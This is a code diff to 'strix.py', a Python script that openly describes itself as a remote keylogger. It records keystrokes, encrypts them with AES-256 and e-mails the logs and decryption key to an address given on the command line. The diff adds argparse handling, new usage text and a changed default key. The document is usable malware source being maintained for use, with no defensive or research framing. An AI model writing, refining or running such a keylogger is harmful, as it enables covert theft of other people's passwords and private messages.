@@ -11,33 +11,35 @@ import threading
 import pyAesCrypt
 import io
 import secrets
+import argparse
 
 '''
 Strix is a remote keylogger tool. Running it saves keystrokes to a stream.
 At regular intervals, the stream is saved to an AES-256 encrypted file "log.txt.aes" and e-mailed to the e-mail address provided.
 
-Usage: python strix.py <E-mail address> "<App password>" [Time interval] [32-bit Encryption key]
+usage: strix.py [-h] [-t TIME_INTERVAL] email app_password
 
-Args:
-    - email (str): E-mail address to send the reports to.
-    - appPassword (str): A generated app-specific password for authentication.
-                Your E-mail's password does not work. For more information, visit https://support.google.com/accounts/answer/185833?hl=en
-Options:
-    - timeInterval (int): Number of seconds in between every other e-mail sent. Default = 60.
-    - key (string): 32-bit encryption key for AES-256 encryption. Changing the length of this key changes the encryption strength.
-                If unspecified, the randomly-generated password will be e-mailed with the report.
+Keylogger "Strix"
+
+positional arguments:
+  email                 Destination e-mail address where keystrokes and the decryption key are sent to.
+  app_password          An app password for authenticating to your mail server. Your E-mail's password does not work. For more information, visit https://support.google.com/accounts/answer/185833?hl=en.
+
+options:
+  -h, --help            show this help message and exit
+  -t, --time-interval TIME_INTERVAL
+                        Number of seconds in between sending every other e-mail (default: 60)
 
 Example:
     python strix.py "johndoe@gmail.com" "your_app_password_here"
-    python strix.py "johndoe@gmail.com" "your_app_password_here" 60
-    python strix.py 'johndoe@gmail.com' "your_app_password_here" 60 "0123456789abcdef0123456789abcdef"
+    python strix.py "johndoe@gmail.com" "your_app_password_here" -t 60
 '''
 
 BUFFERSIZE = 64*1024
 
 class Keylogger:
 
-    def __init__(self, email, password, interval = 60, key="0123456789abcdef0123456789abcdef"):
+    def __init__(self, email, password, interval = 60, key=secrets.token_hex(4)):
         self.logger = ""        # Keystroke stream
         self.email = email
         self.password = password
@@ -198,17 +200,19 @@ class Keylogger:
             listener.join()
 
 if __name__ == "__main__":
-    email = str(sys.argv[1])
-    appPassword = str(sys.argv[2])
-    interval = ""
-    key = ""
-    if len(sys.argv) > 3:
-        interval = int(sys.argv[3])
-    else:
-        interval = 60
-    if len(sys.argv) > 4:
-        key = str(sys.argv[4])
-    else:
-        key= secrets.token_hex(4)
-    keyLogger = Keylogger(email, appPassword, interval, key)
+    parser = argparse.ArgumentParser(description="Keylogger \"Strix\"")
+    parser.add_argument("email",
+                        help="Destination e-mail address where keystrokes and the decryption key are sent to.")
+    parser.add_argument("app_password",
+                        help="An app password for authenticating to your mail server. Your E-mail's password does not work. For more information, visit https://support.google.com/accounts/answer/185833?hl=en.")
+    parser.add_argument("-t", "--time-interval", type=int, default=60,
+                        help="Number of seconds in between sending every other e-mail (default: 60).")
+    args = parser.parse_args()
+    
+    keyLogger = Keylogger(
+        email=args.email,
+        password=args.app_password,
+        interval=args.time_interval,
+    )
+    
     keyLogger.start()
